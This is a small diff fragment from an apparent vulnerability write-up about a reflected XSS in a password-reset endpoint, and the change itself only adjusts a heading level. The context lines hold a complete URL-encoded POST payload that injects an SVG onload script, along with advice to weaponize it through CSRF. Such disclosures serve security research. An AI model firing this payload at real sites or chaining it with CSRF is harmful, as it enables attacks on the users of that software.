@@ -15,7 +15,7 @@ You may use the following payload as a POST request to the URL to reflect the co
 command=Next&Username=%24dc1&DomainName=xxxx.xxxx&ReCaptchaPublicKey=6LxOW5_v5AH39Tex8cBG4b57&g-recaptcha-response=%3c%73%76%67%20%6f%6e%6c%6f%61%64%3d%61%6c%65%72%74%28%31%29%3e&HomeUrl=%2FPasswordReset&X-Requested-With=XMLHttpRequest
 ```
 
-## Weaponization
+### Weaponization
 
 To abuse these POST Request Reflected XSS, you may pair it with a CSRF attack.
 
